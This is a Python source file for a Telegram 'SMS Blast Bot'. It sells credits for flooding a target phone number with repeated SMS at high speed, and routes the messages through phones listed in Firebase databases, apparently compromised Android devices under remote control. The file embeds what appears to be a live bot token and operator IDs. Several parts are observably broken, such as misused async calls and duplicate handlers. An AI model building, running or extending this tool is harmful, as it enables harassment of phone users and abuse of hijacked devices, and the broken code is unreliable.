# ARYAN_PATCHED_V18
# SMS Blast Bot v3.0 ULTRA
# Telegram SMS Blast Bot with Advanced Features
# Developed for Professional SMS Management

import asyncio
import json
import os
import re
import time
import random
import string
import logging
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Any, Tuple
from collections import deque
from contextlib import suppress

import aiohttp
from aiogram import Bot, Dispatcher, types, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, 
    InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton,
    ReplyKeyboardRemove, InputFile, FSInputFile
)
from aiogram.filters import Command, StateFilter, CommandObject
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram.enums import ParseMode
from aiogram.client.default import DefaultBotProperties

# ================================
# CONFIGURATION
# ================================

BOT_TOKEN = "8463766338:AAFrcI21K7QaID2OplD43qg41IY4JcsnsI4"
OWNER_ID = 8242927146
SUPER_ADMINS = [8242927146, 7515864015]
DATA_FILE = "data.json"
DEVICE_CACHE_FILE = "devices_cache.json"
ACTIVITY_LIMIT = 1000

# ================================
# INITIALIZATION
# ================================

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)

bot = Bot(
    token=BOT_TOKEN,
    default=DefaultBotProperties(parse_mode=ParseMode.HTML)
)
dp = Dispatcher(storage=MemoryStorage())

# ================================
# DATA MANAGEMENT
# ================================

class DataManager:
    def __init__(self):
        self.data = {}
        self.lock = asyncio.Lock()
        self._load_data()
        self._load_cache()
        
    def _load_data(self):
        try:
            with open(DATA_FILE, 'r') as f:
                self.data = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self._init_default_data()
            self._save_data()
            
    def _init_default_data(self):
        self.data = {
            "owners": [OWNER_ID],
            "admins": [],
            "banned": [],
            "free_mode": False,
            "approved": [],
            "firebases": [],
            "users": {},
            "stats": {
                "total_sent": 0,
                "total_failed": 0,
                "api_usage": {}
            },
            "premium": {"ref_credits": 3},
            "force_join": {"enabled": False, "channels": []},
            "pricing": {"plans": []},
            "redeem_codes": {},
            "settings": {"ref_credits": 3, "max_owners": 6},
            "sms_history": {},
            "activity_log": [],
            "protected_numbers": []
        }
        
    def _save_data(self):
        with open(DATA_FILE, 'w') as f:
            json.dump(self.data, f, indent=2)
            
    def _load_cache(self):
        try:
            with open(DEVICE_CACHE_FILE, 'r') as f:
                self.device_cache = json.load(f)
        except (FileNotFoundError, json.JSONDecodeError):
            self.device_cache = {"devices": [], "last_scan": 0}
            self._save_cache()
            
    def _save_cache(self):
        with open(DEVICE_CACHE_FILE, 'w') as f:
            json.dump(self.device_cache, f, indent=2)
            
    async def update_cache(self, devices):
        self.device_cache["devices"] = devices
        self.device_cache["last_scan"] = int(time.time())
        self._save_cache()
        
    def get_cache(self):
        return self.device_cache
        
    async def get_data(self):
        return self.data
        
    async def update_data(self, new_data):
        self.data = new_data
        self._save_data()
        
    async def get_user(self, user_id):
        return self.data["users"].get(str(user_id))
        
    async def create_user(self, user_id, name):
        if str(user_id) not in self.data["users"]:
            self.data["users"][str(user_id)] = {
                "name": name,
                "uses": 0,
                "credits": 5,
                "joined_at": int(time.time()),
                "refer_code": self.generate_refer_code(),
                "referred_by": None,
                "sms_history": []
            }
            self._save_data()
            
    def generate_refer_code(self):
        return "REF" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=6))
        
    async def log_activity(self, action, details):
        entry = {
            "timestamp": int(time.time()),
            "action": action,
            "details": details
        }
        self.data["activity_log"].append(entry)
        if len(self.data["activity_log"]) > ACTIVITY_LIMIT:
            self.data["activity_log"] = self.data["activity_log"][-ACTIVITY_LIMIT:]
        self._save_data()
        
    async def is_owner(self, user_id):
        return user_id in self.data["owners"]
        
    async def is_admin(self, user_id):
        return user_id in self.data["admins"] or await self.is_owner(user_id)
        
    async def is_banned(self, user_id):
        return str(user_id) in self.data["banned"]
        
    async def check_force_join(self, user_id):
        if not self.data["force_join"]["enabled"]:
            return True
        channels = self.data["force_join"]["channels"]
        if not channels:
            return True
        # Check membership for each channel
        for channel in channels:
            try:
                member = await bot.get_chat_member(channel, user_id)
                if member.status not in ["member", "administrator", "creator"]:
                    return False
            except:
                return False
        return True
        
    async def is_protected(self, number):
        return number in self.data["protected_numbers"]

db = DataManager()

# ================================
# STATES
# ================================

class SendSMSState(StatesGroup):
    waiting_number = State()
    waiting_message = State()
    waiting_speed = State()
    waiting_count = State()
    waiting_firebase = State()
    
class AdminStates(StatesGroup):
    add_firebase = State()
    add_admin = State()
    remove_admin = State()
    add_owner = State()
    remove_owner = State()
    ban_user = State()
    unban_user = State()
    broadcast = State()
    add_credits = State()
    deduct_credits = State()
    add_channel = State()
    remove_channel = State()
    add_redeem = State()
    redeem_code = State()
    add_protect = State()
    remove_protect = State()

# ================================
# BACKGROUND SCANNER
# ================================

async def device_scanner():
    """Background scanner that runs every 60 seconds"""
    while True:
        try:
            await scan_all_firebases()
        except Exception as e:
            logger.error(f"Scanner error: {e}")
        await asyncio.sleep(60)

async def scan_all_firebases():
    """Scan all Firebase URLs for online devices"""
    data = await db.get_data()
    firebases = data.get("firebases", [])
    online_devices = []
    
    for fb in firebases:
        url = fb.get("url")
        label = fb.get("label", "Unknown")
        fb_id = fb.get("id")
        
        try:
            async with aiohttp.ClientSession() as session:
                # Get all device IDs
                devices_url = f"{url}/clients.json?shallow=true"
                async with session.get(devices_url, timeout=10) as resp:
                    if resp.status != 200:
                        continue
                    device_ids = await resp.json()
                    if not isinstance(device_ids, dict):
                        continue
                        
                # Check each device
                for dev_id in device_ids.keys():
                    status_url = f"{url}/clients/{dev_id}.json"
                    async with session.get(status_url, timeout=10) as resp2:
                        if resp2.status != 200:
                            continue
                        dev_data = await resp2.json()
                        if dev_data and dev_data.get("status") == True:
                            sims = dev_data.get("sims", [])
                            if not sims:
                                sims = [{"simSlotIndex": 0, "phoneNumber": "Default"}]
                            online_devices.append({
                                "fb_id": fb_id,
                                "fb_url": url,
                                "fb_label": label,
                                "dev_id": dev_id,
                                "dev_name": dev_data.get("modelName", "Unknown"),
                                "sims": sims
                            })
        except Exception as e:
            logger.error(f"Scan error for {label}: {e}")
            
    await db.update_cache(online_devices)
    if online_devices:
        logger.info(f"Scanner found {len(online_devices)} online devices")
    return online_devices

# ================================
# SMS SENDING ENGINE
# ================================

class SendingEngine:
    def __init__(self):
        self.active_sessions = {}
        
    def get_speed_delay(self, speed):
        speeds = {"fast": 0.05, "medium": 0.2, "slow": 0.5}
        return speeds.get(speed, 0.2)
        
    async def send_sms(self, user_id, number, message, count, speed):
        user_id = str(user_id)
        if user_id in self.active_sessions:
            return "Session already active"
            
        data = await db.get_data()
        user = await db.get_user(user_id)
        if not user:
            return "User not found"
            
        # Check free mode
        if data.get("free_mode", False):
            # Free mode active, don't deduct credits
            pass
            
        credits = user.get("credits", 0)
        if not data.get("free_mode", False) and credits < count:
            return "Insufficient credits"
            
        devices = db.get_cache().get("devices", [])
        if not devices:
            return "No online devices available"
            
        # Check if number is protected
        if await db.is_protected(number):
            await self.notify_protected_attempt(user_id, number, message)
            return "❌ This number is protected! You cannot send SMS to this number."
            
        # Initialize session
        self.active_sessions[user_id] = {
            "active": True,
            "sent": 0,
            "failed": 0,
            "total": count,
            "started": int(time.time()),
            "devices": devices,
            "speed": speed
        }
        
        # Start sending
        await self._send_loop(user_id, number, message, count, speed, devices)
        return None
        
    async def _send_loop(self, user_id, number, message, count, speed, devices):
        user_id = str(user_id)
        session = self.active_sessions.get(user_id)
        if not session:
            return
            
        delay = self.get_speed_delay(speed)
        sent = 0
        failed = 0
        
        for i in range(count):
            if not session.get("active"):
                break
                
            # Rotate through devices
            device = devices[i % len(devices)]
            success = await self._send_single_sms(device, number, message)
            
            if success:
                sent += 1
                session["sent"] = sent
            else:
                failed += 1
                session["failed"] = failed
                
            # Update stats
            if success:
                data = await db.get_data()
                data["stats"]["total_sent"] += 1
                await db.update_data(data)
                
            await asyncio.sleep(delay)
            
        # Deduct credits only if not in free mode
        data = await db.get_data()
        if not data.get("free_mode", False):
            user = await db.get_user(user_id)
            if user:
                user["credits"] -= sent
                user["uses"] += sent
                # Update SMS history
                user["sms_history"].append({
                    "number": number,
                    "message": message[:50],
                    "count": sent,
                    "timestamp": int(time.time())
                })
                await db.update_data(data)
                
        # Remove session
        self.active_sessions.pop(user_id, None)
        
    async def _send_single_sms(self, device, number, message):
        try:
            url = f"{device['fb_url']}/clients/{device['dev_id']}/webhookEvent/sendSms.json"
            sim = device['sims'][0] if device['sims'] else {"simSlotIndex": 0, "phoneNumber": "Default"}
            
            payload = {
                "to": number,
                "message": message,
                "from": sim.get("phoneNumber", "Default"),
                "isSended": False,
                "timestamp": int(time.time())
            }
            
            async with aiohttp.ClientSession() as session:
                async with session.put(url, json=payload, timeout=10) as resp:
                    return resp.status in [200, 201]
        except Exception as e:
            logger.error(f"Send error: {e}")
            return False
            
    def stop_session(self, user_id):
        user_id = str(user_id)
        if user_id in self.active_sessions:
            self.active_sessions[user_id]["active"] = False
            return True
        return False
        
    async def notify_protected_attempt(self, user_id, number, message):
        """Notify all owners and admins about protected number attempt"""
        data = await db.get_data()
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        user = await db.get_user(user_id)
        username = user.get("name", "Unknown") if user else "Unknown"
        
        alert_msg = (
            f"🚨 <b>PROTECTED NUMBER ATTEMPT</b>\n\n"
            f"👤 User: {user_id}\n"
            f"📛 Name: {username}\n"
            f"📱 Protected Number: {number}\n"
            f"💬 Message: {message[:50]}...\n"
            f"🕐 Time: {timestamp}"
        )
        
        # Notify owners
        for owner in data["owners"]:
            try:
                await bot.send_message(owner, alert_msg)
            except:
                pass
                
        # Notify admins
        for admin in data["admins"]:
            try:
                await bot.send_message(admin, alert_msg)
            except:
                pass
                
        await db.log_activity("protected_number_attempt", {
            "user_id": user_id,
            "username": username,
            "number": number,
            "timestamp": timestamp
        })

send_engine = SendingEngine()

# ================================
# KEYBOARDS
# ================================

def get_main_keyboard(user_id):
    user_id = str(user_id)
    is_admin = asyncio.run(db.is_admin(user_id))
    is_owner = asyncio.run(db.is_owner(user_id))
    
    if is_owner:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 Send SMS", callback_data="owner:send"),
             InlineKeyboardButton(text="🔥 Manage Firebase", callback_data="owner:firebase")],
            [InlineKeyboardButton(text="👑 Manage Super Admins", callback_data="owner:admins"),
             InlineKeyboardButton(text="🛡 Manage Admins", callback_data="owner:regular_admins")],
            [InlineKeyboardButton(text="👥 View Users", callback_data="owner:users"),
             InlineKeyboardButton(text="🚫 Ban User", callback_data="owner:ban")],
            [InlineKeyboardButton(text="✅ Unban User", callback_data="owner:unban"),
             InlineKeyboardButton(text="📢 Broadcast", callback_data="owner:broadcast")],
            [InlineKeyboardButton(text="📊 API Stats", callback_data="owner:stats"),
             InlineKeyboardButton(text="📜 Activity Log", callback_data="owner:log")],
            [InlineKeyboardButton(text="💳 Pricing Plans", callback_data="owner:pricing"),
             InlineKeyboardButton(text="🎁 Redeem Codes", callback_data="owner:redeem")],
            [InlineKeyboardButton(text="💰 Add Credits", callback_data="owner:add_credits"),
             InlineKeyboardButton(text="💰 Deduct Credits", callback_data="owner:deduct_credits")],
            [InlineKeyboardButton(text="🔗 Force Join", callback_data="owner:force_join"),
             InlineKeyboardButton(text="⚙️ Settings", callback_data="owner:settings")],
            [InlineKeyboardButton(text="🛡 Protect Number", callback_data="owner:protect:menu"),
             InlineKeyboardButton(text="📋 SMS History", callback_data="owner:history")],
            [InlineKeyboardButton(text="📤 Export Script", callback_data="owner:export")],
            [InlineKeyboardButton(text="🔵 Enable Free Mode" if not asyncio.run(db.get_data()).get("free_mode", False) else "🔴 Disable Free Mode", 
                                 callback_data="owner:toggle_free")],
            [InlineKeyboardButton(text="🔄 Refresh", callback_data="owner:refresh")]
        ])
    elif is_admin:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 Send SMS", callback_data="admin:send"),
             InlineKeyboardButton(text="🛡 Protect Number", callback_data="admin:protect:menu")],
            [InlineKeyboardButton(text="👥 View Users", callback_data="admin:users"),
             InlineKeyboardButton(text="📊 API Stats", callback_data="admin:stats")],
            [InlineKeyboardButton(text="🚫 Ban User", callback_data="admin:ban"),
             InlineKeyboardButton(text="✅ Unban User", callback_data="admin:unban")],
            [InlineKeyboardButton(text="📢 Broadcast", callback_data="admin:broadcast")],
            [InlineKeyboardButton(text="🔄 Refresh", callback_data="admin:refresh")]
        ])
    else:
        return InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="📤 Send SMS", callback_data="user:send")],
            [InlineKeyboardButton(text="💳 Credits", callback_data="user:credits"),
             InlineKeyboardButton(text="🎁 Redeem", callback_data="user:redeem")],
            [InlineKeyboardButton(text="👥 Refer", callback_data="user:refer"),
             InlineKeyboardButton(text="📊 Stats", callback_data="user:stats")],
            [InlineKeyboardButton(text="📜 My SMS History", callback_data="user:history")],
            [InlineKeyboardButton(text="💰 Buy Credits", callback_data="user:buy")],
            [InlineKeyboardButton(text="ℹ️ Info", callback_data="user:info")]
        ])

# ================================
# COMMAND HANDLERS
# ================================

@dp.message(Command("start"))
async def cmd_start(message: Message, state: FSMContext):
    user_id = str(message.from_user.id)
    name = message.from_user.full_name
    
    # Check ban
    if await db.is_banned(user_id):
        await message.reply("❌ You are banned from using this bot.")
        return
        
    # Check force join
    if not await db.check_force_join(int(user_id)):
        await message.reply(
            "❌ You must join our channel(s) to use this bot.\n"
            "Please join and try again."
        )
        return
        
    # Create user if not exists
    await db.create_user(user_id, name)
    
    # Handle referral
    if message.text and len(message.text.split()) > 1:
        ref_code = message.text.split()[1]
        if ref_code and ref_code.startswith("REF"):
            user = await db.get_user(user_id)
            if user and not user.get("referred_by"):
                data = await db.get_data()
                ref_credits = data["settings"].get("ref_credits", 3)
                
                # Credit referrer
                for uid, u in data["users"].items():
                    if u.get("refer_code") == ref_code:
                        u["credits"] += ref_credits
                        await db.log_activity("referral", f"User {name} used refer code {ref_code}")
                        break
                        
                # Credit new user
                user["credits"] += ref_credits
                user["referred_by"] = ref_code
                await db.update_data(data)
                await message.reply(f"✅ You earned {ref_credits} credits from referral!")
    
    keyboard = await get_main_keyboard(int(user_id))
    await message.reply(
        f"Welcome to <b>SMS Blast Bot v3.0 ULTRA</b>\n\n"
        f"👤 User: {name}\n"
        f"🆔 ID: {user_id}\n"
        f"💳 Credits: {await self.get_user_credits(user_id)}\n\n"
        f"Use the buttons below to get started.",
        reply_markup=keyboard
    )

@dp.message(Command("help"))
async def cmd_help(message: Message):
    await message.reply(
        "📖 <b>SMS Blast Bot v3.0 ULTRA</b>\n\n"
        "Commands:\n"
        "/start - Start the bot\n"
        "/help - Show this help\n\n"
        "Features:\n"
        "📤 Send SMS - Send bulk SMS\n"
        "💳 Credits - Check your credits\n"
        "🎁 Redeem - Redeem promo codes\n"
        "👥 Refer - Get referral link\n"
        "📊 Stats - View your stats\n"
        "📜 History - View SMS history\n"
        "💰 Buy Credits - Purchase credits\n"
        "ℹ️ Info - Bot information"
    )

# ================================
# CALLBACK HANDLERS
# ================================

@dp.callback_query(F.data.startswith("owner:"))
async def owner_callback(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    
    if not await db.is_owner(int(user_id)):
        await callback.answer("❌ You are not an owner.")
        return
        
    await callback.answer()
    action = callback.data.replace("owner:", "")
    
    if action == "send":
        await start_send_flow(callback.message, state, user_id, "owner")
    elif action == "firebase":
        await manage_firebase(callback.message, state, user_id)
    elif action == "admins":
        await manage_super_admins(callback.message, state, user_id)
    elif action == "regular_admins":
        await manage_regular_admins(callback.message, state, user_id)
    elif action == "users":
        await view_users(callback.message, user_id)
    elif action == "ban":
        await ban_user_flow(callback.message, state, user_id)
    elif action == "unban":
        await unban_user_flow(callback.message, state, user_id)
    elif action == "broadcast":
        await broadcast_flow(callback.message, state, user_id)
    elif action == "stats":
        await show_stats(callback.message, user_id)
    elif action == "log":
        await show_activity_log(callback.message, user_id)
    elif action == "pricing":
        await manage_pricing(callback.message, state, user_id)
    elif action == "redeem":
        await manage_redeem(callback.message, state, user_id)
    elif action == "add_credits":
        await add_credits_flow(callback.message, state, user_id)
    elif action == "deduct_credits":
        await deduct_credits_flow(callback.message, state, user_id)
    elif action == "force_join":
        await manage_force_join(callback.message, state, user_id)
    elif action == "settings":
        await show_settings(callback.message, user_id)
    elif action == "protect:menu":
        await protect_menu(callback.message, state, user_id, "owner")
    elif action == "history":
        await show_sms_history(callback.message, user_id, "global")
    elif action == "export":
        await export_script(callback.message, user_id)
    elif action == "toggle_free":
        await toggle_free_mode(callback.message, user_id)
    elif action == "refresh":
        keyboard = await get_main_keyboard(int(user_id))
        await callback.message.edit_text("🔄 Refreshed!", reply_markup=keyboard)
    else:
        await callback.message.reply("❌ Invalid option.")

@dp.callback_query(F.data.startswith("admin:"))
async def admin_callback(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    
    if not await db.is_admin(int(user_id)):
        await callback.answer("❌ You are not an admin.")
        return
        
    await callback.answer()
    action = callback.data.replace("admin:", "")
    
    if action == "send":
        await start_send_flow(callback.message, state, user_id, "admin")
    elif action == "protect:menu":
        await protect_menu(callback.message, state, user_id, "admin")
    elif action == "users":
        await view_users(callback.message, user_id)
    elif action == "stats":
        await show_stats(callback.message, user_id)
    elif action == "ban":
        await ban_user_flow(callback.message, state, user_id)
    elif action == "unban":
        await unban_user_flow(callback.message, state, user_id)
    elif action == "broadcast":
        await broadcast_flow(callback.message, state, user_id)
    elif action == "refresh":
        keyboard = await get_main_keyboard(int(user_id))
        await callback.message.edit_text("🔄 Refreshed!", reply_markup=keyboard)
    else:
        await callback.message.reply("❌ Invalid option.")

@dp.callback_query(F.data.startswith("user:"))
async def user_callback(callback: CallbackQuery, state: FSMContext):
    user_id = str(callback.from_user.id)
    
    if await db.is_banned(user_id):
        await callback.answer("❌ You are banned.")
        return
        
    await callback.answer()
    action = callback.data.replace("user:", "")
    
    if action == "send":
        await start_send_flow(callback.message, state, user_id, "user")
    elif action == "credits":
        await show_credits(callback.message, user_id)
    elif action == "redeem":
        await redeem_code_flow(callback.message, state, user_id)
    elif action == "refer":
        await show_referral(callback.message, user_id)
    elif action == "stats":
        await show_user_stats(callback.message, user_id)
    elif action == "history":
        await show_user_history(callback.message, user_id)
    elif action == "buy":
        await show_pricing(callback.message, user_id)
    elif action == "info":
        await show_info(callback.message, user_id)
    else:
        await callback.message.reply("❌ Invalid option.")

# ================================
# PROTECT NUMBER FUNCTIONS
# ================================

async def protect_menu(message: Message, state: FSMContext, user_id: str, role: str):
    """Show protect number menu"""
    data = await db.get_data()
    protected = data.get("protected_numbers", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Add Protected Number", callback_data=f"{role}:protect:add")],
        [InlineKeyboardButton("🗑 Remove Protected Number", callback_data=f"{role}:protect:remove")],
        [InlineKeyboardButton("📋 View Protected Numbers", callback_data=f"{role}:protect:view")],
        [InlineKeyboardButton("⬅️ Back", callback_data=f"{role}:refresh")]
    ])
    
    await message.reply(
        f"🛡 <b>Protect Number Menu</b>\n\n"
        f"Protected numbers: {len(protected)}\n\n"
        f"Select an option:",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.endswith("protect:add"))
async def protect_add(callback: CallbackQuery, state: FSMContext):
    """Start add protect number flow"""
    role = callback.data.split(":")[0]
    await callback.answer()
    await callback.message.reply(
        "📱 <b>Add Protected Number</b>\n\n"
        "Send the number you want to protect.\n"
        "Format: <code>+919876543210</code>\n\n"
        "Send /cancel to cancel."
    )
    await state.set_state(AdminStates.add_protect)
    await state.update_data(role=role)

@dp.callback_query(F.data.endswith("protect:remove"))
async def protect_remove(callback: CallbackQuery, state: FSMContext):
    """Show protected numbers to remove"""
    role = callback.data.split(":")[0]
    await callback.answer()
    
    data = await db.get_data()
    protected = data.get("protected_numbers", [])
    
    if not protected:
        await callback.message.reply("❌ No protected numbers found.")
        return
        
    keyboard = []
    for number in protected:
        keyboard.append([InlineKeyboardButton(f"📱 {number}", callback_data=f"{role}:protect:remove:{number}")])
    keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data=f"{role}:protect:menu")])
    
    await callback.message.reply(
        "🗑 <b>Remove Protected Number</b>\n\n"
        "Select a number to remove:",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard)
    )

@dp.callback_query(F.data.startswith("owner:protect:remove:") | F.data.startswith("admin:protect:remove:"))
async def protect_remove_confirm(callback: CallbackQuery, state: FSMContext):
    """Remove a protected number"""
    parts = callback.data.split(":")
    role = parts[0]
    number = ":".join(parts[3:])  # Handle numbers with + sign
    
    data = await db.get_data()
    if number in data["protected_numbers"]:
        data["protected_numbers"].remove(number)
        await db.update_data(data)
        await callback.answer("✅ Number removed from protection!")
        await callback.message.reply(f"✅ Removed {number} from protected numbers.")
    else:
        await callback.answer("❌ Number not found.")
        
@dp.callback_query(F.data.endswith("protect:view"))
async def protect_view(callback: CallbackQuery, state: FSMContext):
    """View all protected numbers"""
    role = callback.data.split(":")[0]
    await callback.answer()
    
    data = await db.get_data()
    protected = data.get("protected_numbers", [])
    
    if not protected:
        await callback.message.reply("📋 No protected numbers.")
        return
        
    numbers_text = "\n".join([f"📱 {num}" for num in protected])
    
    await callback.message.reply(
        f"📋 <b>Protected Numbers</b>\n\n"
        f"Total: {len(protected)}\n\n"
        f"{numbers_text}\n\n"
        f"<i>All owners and admins are notified when someone tries to send to these numbers.</i>",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton("⬅️ Back", callback_data=f"{role}:protect:menu")]
        ])
    )

@dp.message(AdminStates.add_protect)
async def process_add_protect(message: Message, state: FSMContext):
    """Process adding protected number"""
    number = message.text.strip()
    
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await message.reply("❌ Invalid number format. Use: +919876543210")
        return
        
    data = await db.get_data()
    if number in data.get("protected_numbers", []):
        await message.reply("❌ Number already protected.")
        return
        
    data["protected_numbers"].append(number)
    await db.update_data(data)
    await db.log_activity("protect_add", f"Added protected number: {number}")
    
    await message.reply(f"✅ Number {number} is now protected.")
    await state.clear()

# ================================
# SMS SEND FUNCTIONS
# ================================

async def start_send_flow(message: Message, state: FSMContext, user_id: str, role: str):
    """Start SMS sending flow"""
    await state.clear()
    await state.set_state(SendSMSState.waiting_number)
    await state.update_data(role=role)
    
    await message.reply(
        "📤 <b>Send SMS</b>\n\n"
        "Enter the phone number to send SMS to:\n"
        "Format: <code>+919876543210</code>\n\n"
        "Send /cancel to cancel."
    )

@dp.message(SendSMSState.waiting_number)
async def process_number(message: Message, state: FSMContext):
    """Process phone number"""
    number = message.text.strip()
    
    if not re.match(r"^\+?[0-9]{10,15}$", number):
        await message.reply("❌ Invalid number. Please send a valid phone number:")
        return
        
    await state.update_data(number=number)
    await state.set_state(SendSMSState.waiting_message)
    await message.reply(
        "📝 <b>Enter Message</b>\n\n"
        "Send the message you want to send.\n"
        "Maximum 160 characters per SMS.\n\n"
        "Send /cancel to cancel."
    )

@dp.message(SendSMSState.waiting_message)
async def process_message(message: Message, state: FSMContext):
    """Process message"""
    msg_text = message.text.strip()
    
    if len(msg_text) > 160:
        await message.reply("❌ Message too long. Maximum 160 characters.")
        return
        
    await state.update_data(message=msg_text)
    await state.set_state(SendSMSState.waiting_speed)
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("🚀 Fast (0.05s)", callback_data="speed:fast")],
        [InlineKeyboardButton("⚡ Medium (0.2s)", callback_data="speed:medium")],
        [InlineKeyboardButton("🐢 Slow (0.5s)", callback_data="speed:slow")]
    ])
    
    await message.reply(
        "⚡ <b>Select Speed</b>\n\n"
        "Choose the sending speed:",
        reply_markup=keyboard
    )

@dp.callback_query(F.data.startswith("speed:"))
async def process_speed(callback: CallbackQuery, state: FSMContext):
    """Process speed selection"""
    speed = callback.data.replace("speed:", "")
    await state.update_data(speed=speed)
    await state.set_state(SendSMSState.waiting_count)
    
    await callback.answer()
    await callback.message.reply(
        "🔢 <b>Enter Count</b>\n\n"
        "How many SMS to send?\n"
        "Enter a number.\n\n"
        "Send /cancel to cancel."
    )

@dp.message(SendSMSState.waiting_count)
async def process_count(message: Message, state: FSMContext):
    """Process count and start sending"""
    try:
        count = int(message.text.strip())
        if count <= 0:
            raise ValueError
    except ValueError:
        await message.reply("❌ Please enter a valid positive number:")
        return
        
    data = await state.get_data()
    number = data["number"]
    msg_text = data["message"]
    speed = data["speed"]
    role = data.get("role", "user")
    user_id = str(message.from_user.id)
    
    # Check if number is protected
    if await db.is_protected(number):
        await send_engine.notify_protected_attempt(user_id, number, msg_text)
        await message.reply("❌ This number is protected! You cannot send SMS to this number.")
        await state.clear()
        return
        
    # Start sending
    result = await send_engine.send_sms(user_id, number, msg_text, count, speed)
    
    if result:
        await message.reply(f"❌ {result}")
        await state.clear()
        return
        
    # Show progress
    await show_progress(message, user_id, count)

async def show_progress(message: Message, user_id: str, total: int):
    """Show sending progress"""
    session = send_engine.active_sessions.get(user_id)
    if not session:
        return
        
    while session.get("active"):
        sent = session.get("sent", 0)
        failed = session.get("failed", 0)
        total = session.get("total", 1)
        progress = int((sent + failed) / total * 100)
        progress_bar = "▓" * (progress // 5) + "░" * (20 - progress // 5)
        
        await message.edit_text(
            f"📤 <b>Sending SMS</b>\n\n"
            f"{progress_bar} {progress}%\n"
            f"✅ Sent: {sent}\n"
            f"❌ Failed: {failed}\n"
            f"📊 Total: {total}\n"
            f"⏱ Remaining: {total - sent - failed}\n\n"
            f"<i>Speed: {session.get('speed', 'medium')}</i>\n"
            f"<i>Click below to stop</i>",
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton("⏹ Stop", callback_data=f"stop:{user_id}")]
            ])
        )
        await asyncio.sleep(1)
        
        if not session.get("active"):
            break
            
    # Final status
    sent = session.get("sent", 0)
    failed = session.get("failed", 0)
    
    await message.edit_text(
        f"✅ <b>Sending Complete</b>\n\n"
        f"✅ Sent: {sent}\n"
        f"❌ Failed: {failed}\n"
        f"📊 Total: {sent + failed}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton("🔄 Back to Menu", callback_data="refresh")]
        ])
    )

@dp.callback_query(F.data.startswith("stop:"))
async def stop_sending(callback: CallbackQuery):
    """Stop SMS sending"""
    user_id = callback.data.replace("stop:", "")
    if send_engine.stop_session(user_id):
        await callback.answer("⏹ Stopped sending!")
        await callback.message.edit_text("⏹ <b>Sending Stopped</b>\n\nYou can start a new send anytime.")
    else:
        await callback.answer("❌ No active session found.")

# ================================
# FIREBASE MANAGEMENT
# ================================

async def manage_firebase(message: Message, state: FSMContext, user_id: str):
    """Manage Firebase URLs"""
    data = await db.get_data()
    firebases = data.get("firebases", [])
    
    keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton("➕ Add Firebase", callback_data="firebase:add")],
        [InlineKeyboardButton("🗑 Remove Firebase", callback_data="firebase:remove")],
        [InlineKeyboardButton("🔄 Refresh Cache", callback_data="firebase:refresh")],
        [InlineKeyboardButton("⬅️ Back", callback_data="owner:refresh")]
    ])
    
    fb_text = f"🔥 <b>Firebase Management</b>\n\n"
    if firebases:
        fb_text += f"Total: {len(firebases)}\n\n"
        for fb in firebases:
            fb_text += f"📌 {fb.get('label', 'Unknown')}\n"
            fb_text += f"🔗 {fb.get('url', '')}\n"
            fb_text += f"🆔 {fb.get('id', '')}\n\n"
    else:
        fb_text += "No Firebase URLs configured."
    
    await message.reply(fb_text, reply_markup=keyboard)

@dp.callback_query(F.data == "firebase:add")
async def add_firebase(callback: CallbackQuery, state: FSMContext):
    """Add Firebase URL"""
    await callback.answer()
    await state.set_state(AdminStates.add_firebase)
    await callback.message.reply(
        "🔥 <b>Add Firebase</b>\n\n"
        "Send the Firebase URL:\n"
        "<code>https://your-project.firebaseio.com</code>\n\n"
        "Then send the label/name for this Firebase.\n"
        "Send /cancel to cancel."
    )

@dp.message(AdminStates.add_firebase)
async def process_add_firebase(message: Message, state: FSMContext):
    """Process adding Firebase"""
    try:
        url = message.text.strip()
        
        if not url.startswith("https://") or not url.endswith(".firebaseio.com"):
            await message.reply("❌ Invalid Firebase URL. Must be https://...firebaseio.com")
            return
            
        # Get label
        await state.update_data(url=url)
        await message.reply("📌 Enter a label for this Firebase (e.g., 'Primary Server'):")
        await state.set_state(AdminStates.add_firebase)  # Keep state for next step
        
    except Exception as e:
        await message.reply(f"❌ Error: {e}")

@dp.message(AdminStates.add_firebase)
async def process_firebase_label(message: Message, state: FSMContext):
    """Process Firebase label"""
    data = await state.get_data()
    url = data.get("url")
    label = message.text.strip()
    
    if not label:
        await message.reply("❌ Label cannot be empty.")
        return
        
    # Save Firebase
    db_data = await db.get_data()
    db_data["firebases"].append({
        "id": int(time.time()),
        "url": url,
        "label": label,
        "added_at": int(time.time())
    })
    await db.update_data(db_data)
    await db.log_activity("firebase_add", f"Added: {label}")
    
    await message.reply(f"✅ Firebase added: {label}\n{url}")
    await state.clear()
    
# ================================
# USER MANAGEMENT
# ================================

async def view_users(message: Message, user_id: str):
    """View all users"""
    data = await db.get_data()
    users = data.get("users", {})
    
    if not users:
        await message.reply("❌ No users registered.")
        return
        
    text = f"👥 <b>Total Users: {len(users)}</b>\n\n"
    for uid, user in list(users.items())[:20]:
        text += f"🆔 {uid}\n"
        text += f"📛 {user.get('name', 'Unknown')}\n"
